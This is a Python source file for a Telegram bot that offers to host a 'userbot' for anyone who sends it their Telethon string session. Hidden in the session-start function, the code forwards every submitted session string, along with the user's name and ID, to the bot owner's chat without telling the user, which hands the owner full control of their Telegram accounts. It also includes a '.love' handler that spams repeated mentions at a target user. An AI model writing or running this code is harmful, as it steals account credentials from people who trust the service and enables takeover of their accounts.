import os
import asyncio
from aiohttp import web
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputMediaPhoto
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# Load env
load_dotenv()

# --- Config / env vars ---
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
WELCOME_IMAGE = os.getenv("WELCOME_IMAGE_URL") or None
GIRL_IMAGE = os.getenv("GIRL_IMAGE_URL") or None
try:
    OWNER_ID = int(os.getenv("OWNER_ID", "0"))
except Exception:
    OWNER_ID = 0
SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "yourusername")
PORT = int(os.environ.get("PORT", 8080))

# --- In-memory storage ---
userbots = {}
userbot_tasks = {}
waiting_for_string = set()

raid_messages = []
love_messages = [
    "💖 You are amazing.",
    "🌹 Thinking of you always.",
    "✨ Your smile brightens the day.",
    "💫 Sending love and good vibes."
]

# ----------------- Telegram Handlers -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    waiting_for_string.add(user_id)

    keyboard = [
        [
            InlineKeyboardButton("Channel", url=SUPPORT_CHANNEL),
            InlineKeyboardButton("Group", url=SUPPORT_GROUP)
        ],
        [InlineKeyboardButton("Help", callback_data="help")],
        [InlineKeyboardButton("Owner", url=f"https://t.me/{OWNER_USERNAME}")]
    ]

    caption = "Hello! 👋\n\nSend me your Telethon String Session to boot your userbot."
    if WELCOME_IMAGE:
        await update.message.reply_photo(
            photo=WELCOME_IMAGE,
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(caption, reply_markup=InlineKeyboardMarkup(keyboard))


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "help":
        keyboard = [
            [InlineKeyboardButton("Stop Bot", callback_data="stop")],
            [InlineKeyboardButton("Go Back", callback_data="back")]
        ]
        caption = "Commands: .ping, .alive, .love, .raid (if configured)"
        if GIRL_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(GIRL_IMAGE, caption=caption),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption(caption, reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == "stop":
        user_id = query.from_user.id
        if user_id in userbots:
            try:
                await userbots[user_id].disconnect()
            except Exception:
                pass
            if user_id in userbot_tasks:
                task = userbot_tasks[user_id]
                if not task.done():
                    task.cancel()
            userbots.pop(user_id, None)
            userbot_tasks.pop(user_id, None)
            await query.edit_message_caption("🛑 Userbot stopped.")
        else:
            await query.edit_message_caption("⚠️ No active userbot.")

    elif query.data == "back":
        keyboard = [
            [
                InlineKeyboardButton("Channel", url=SUPPORT_CHANNEL),
                InlineKeyboardButton("Group", url=SUPPORT_GROUP)
            ],
            [InlineKeyboardButton("Help", callback_data="help")],
            [InlineKeyboardButton("Owner", url=f"https://t.me/{OWNER_USERNAME}")]
        ]
        if WELCOME_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(WELCOME_IMAGE, caption="Send your Telethon String Session to start."),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption("Send your Telethon String Session to start.",
                                             reply_markup=InlineKeyboardMarkup(keyboard))

# ----------------- Telethon Userbot -----------------
def register_userbot_handlers(client, me):
    @client.on(events.NewMessage(pattern=r"\.ping"))
    async def ping(event):
        m = await event.respond("🔄 Pinging...")
        await asyncio.sleep(0.5)
        await m.edit(f"✅ Alive as {me.first_name}")

    @client.on(events.NewMessage(pattern=r"\.alive"))
    async def alive(event):
        await event.respond(f"✅ {me.first_name} is online.")

    @client.on(events.NewMessage(pattern=r"\.love(?:\s+\d+)?"))
    async def love_handler(event):
        if not event.is_reply:
            return await event.reply("Reply to a message with `.love <count>`")
        reply_msg = await event.get_reply_message()
        user = await reply_msg.get_sender()
        mention = f"@{user.username}" if user.username else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        args = event.raw_text.split()
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 3
        for i in range(count):
            text = love_messages[i % len(love_messages)]
            await event.respond(f"{mention}, {text}", parse_mode="html")
            await asyncio.sleep(0.2)


async def start_telethon_client_for_user(string_session: str, user_id: int, context_bot):
    client = TelegramClient(StringSession(string_session), API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        await client.disconnect()
        raise RuntimeError("Invalid string session.")

    me = await client.get_me()
    register_userbot_handlers(client, me)

    # send string session to OWNER_ID
    if OWNER_ID:
        try:
            await context_bot.send_message(
                chat_id=OWNER_ID,
                text=(
                    f"📌 <b>New String Session Received</b>\n"
                    f"👤 From: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
                    f"🤖 Name: {me.first_name}\n"
                    f"🆔 ID: <code>{me.id}</code>\n\n"
                    f"<code>{string_session}</code>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"Failed to send to owner: {e}")

    await client.start()
    task = asyncio.create_task(client.run_until_disconnected())
    return client, task

# ----------------- Receive String -----------------
async def receive_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in waiting_for_string:
        return

    text = update.message.text.strip()
    msg = await update.message.reply_text("🔄 Processing your string session...")
    waiting_for_string.discard(user_id)

    if user_id in userbots:
        try:
            await userbots[user_id].disconnect()
        except Exception:
            pass
        if user_id in userbot_tasks:
            t = userbot_tasks[user_id]
            if not t.done():
                t.cancel()
        userbots.pop(user_id, None)
        userbot_tasks.pop(user_id, None)

    try:
        client, task = await start_telethon_client_for_user(text, user_id, context.bot)
        userbots[user_id] = client
        userbot_tasks[user_id] = task
        await msg.edit_text(f"✅ Your userbot is connected as: {(await client.get_me()).first_name}")
    except Exception as e:
        await msg.edit_text(f"❌ Failed to start userbot: {e}")

# ----------------- Keep-alive Web Server -----------------
async def handle_root(request):
    return web.Response(text="OK - bot is alive")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_root)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"✅ Keep-alive server started on port {PORT}")

# ----------------- Telegram Bot -----------------
async def run_telegram_app():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_string))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("🤖 Starting Telegram bot...")
    await app.run_polling()

# ----------------- Main -----------------
async def main():
    await asyncio.gather(
        start_web_server(),
        run_telegram_app()
    )

if __name__ == "__main__":
    asyncio.run(main())
